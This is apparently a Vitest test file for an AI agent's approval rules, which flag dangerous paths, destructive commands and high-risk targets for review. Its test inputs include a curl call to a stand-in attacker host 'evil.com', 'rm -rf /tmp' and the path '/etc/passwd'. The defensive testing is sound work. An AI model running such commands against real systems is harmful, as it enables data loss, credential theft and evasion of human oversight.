import { describe, expect, it } from 'vitest';

import {
  isDangerousPath,
  matchesAny,
  shouldInvokeClassifier,
  GOVERNANCE_INTENTS,
  DESTRUCTIVE_COMMAND_PATTERNS,
  SAFE_TERMINAL_COMMAND_PATTERNS,
  HIGH_RISK_TARGET_PATTERNS
} from '../src/governance/approval/approval-rules';
import { ActionIntent } from '@agent/core';

describe('approval-rules', () => {
  describe('isDangerousPath', () => {
    it('returns true for absolute path', () => {
      expect(isDangerousPath('/etc/passwd')).toBe(true);
    });

    it('returns true for path with ..', () => {
      expect(isDangerousPath('src/../../../etc')).toBe(true);
    });

    it('returns true for .git directory', () => {
      expect(isDangerousPath('.git/config')).toBe(true);
    });

    it('returns true for .svn directory', () => {
      expect(isDangerousPath('.svn/entries')).toBe(true);
    });

    it('returns true for empty path', () => {
      expect(isDangerousPath('')).toBe(true);
    });

    it('returns true for whitespace-only path', () => {
      expect(isDangerousPath('   ')).toBe(true);
    });

    it('returns false for safe relative path', () => {
      expect(isDangerousPath('src/index.ts')).toBe(false);
    });

    it('handles backslashes', () => {
      expect(isDangerousPath('.git\\config')).toBe(true);
    });
  });

  describe('matchesAny', () => {
    it('returns true when value matches pattern', () => {
      expect(matchesAny('rm -rf /tmp', DESTRUCTIVE_COMMAND_PATTERNS)).toBe(true);
    });

    it('returns false when value does not match', () => {
      expect(matchesAny('ls -la', DESTRUCTIVE_COMMAND_PATTERNS)).toBe(false);
    });

    it('returns true for safe terminal patterns', () => {
      expect(matchesAny('pnpm test', SAFE_TERMINAL_COMMAND_PATTERNS)).toBe(true);
      expect(matchesAny('npm run build', SAFE_TERMINAL_COMMAND_PATTERNS)).toBe(true);
      expect(matchesAny('tsc', SAFE_TERMINAL_COMMAND_PATTERNS)).toBe(true);
      expect(matchesAny('vitest', SAFE_TERMINAL_COMMAND_PATTERNS)).toBe(true);
    });

    it('returns true for high risk target patterns', () => {
      expect(matchesAny('main', HIGH_RISK_TARGET_PATTERNS)).toBe(true);
      expect(matchesAny('production', HIGH_RISK_TARGET_PATTERNS)).toBe(true);
      expect(matchesAny('release', HIGH_RISK_TARGET_PATTERNS)).toBe(true);
    });
  });

  describe('GOVERNANCE_INTENTS', () => {
    it('contains promote_skill, enable_plugin, modify_rule', () => {
      expect(GOVERNANCE_INTENTS.has(ActionIntent.PROMOTE_SKILL)).toBe(true);
      expect(GOVERNANCE_INTENTS.has(ActionIntent.ENABLE_PLUGIN)).toBe(true);
      expect(GOVERNANCE_INTENTS.has(ActionIntent.MODIFY_RULE)).toBe(true);
    });

    it('does not contain read_file', () => {
      expect(GOVERNANCE_INTENTS.has(ActionIntent.READ_FILE)).toBe(false);
    });
  });

  describe('shouldInvokeClassifier', () => {
    it('returns true for terminal with non-safe command', () => {
      const tool = { name: 'run_terminal', family: 'terminal' } as any;
      expect(shouldInvokeClassifier(ActionIntent.EXECUTE, tool, { command: 'curl http://evil.com' })).toBe(true);
    });

    it('returns false for terminal with safe command', () => {
      const tool = { name: 'run_terminal', family: 'terminal' } as any;
      expect(shouldInvokeClassifier(ActionIntent.EXECUTE, tool, { command: 'pnpm test' })).toBe(false);
    });

    it('returns false for terminal with empty command', () => {
      const tool = { name: 'run_terminal', family: 'terminal' } as any;
      expect(shouldInvokeClassifier(ActionIntent.EXECUTE, tool, { command: '' })).toBe(false);
    });

    it('returns true for filesystem write with path', () => {
      const tool = { name: 'write_file', family: 'filesystem' } as any;
      expect(shouldInvokeClassifier(ActionIntent.WRITE_FILE, tool, { path: 'src/index.ts' })).toBe(true);
    });

    it('returns false for filesystem write without path', () => {
      const tool = { name: 'write_file', family: 'filesystem' } as any;
      expect(shouldInvokeClassifier(ActionIntent.WRITE_FILE, tool, {})).toBe(false);
    });

    it('returns true for http_request with POST method', () => {
      const tool = { name: 'http_request', family: 'http' } as any;
      expect(shouldInvokeClassifier(ActionIntent.CALL_EXTERNAL_API, tool, { method: 'POST' })).toBe(true);
    });

    it('returns false for http_request with GET method', () => {
      const tool = { name: 'http_request', family: 'http' } as any;
      expect(shouldInvokeClassifier(ActionIntent.CALL_EXTERNAL_API, tool, { method: 'GET' })).toBe(false);
    });

    it('returns false for unknown tool', () => {
      const tool = { name: 'unknown', family: 'unknown' } as any;
      expect(shouldInvokeClassifier(ActionIntent.EXECUTE, tool)).toBe(false);
    });
  });
});
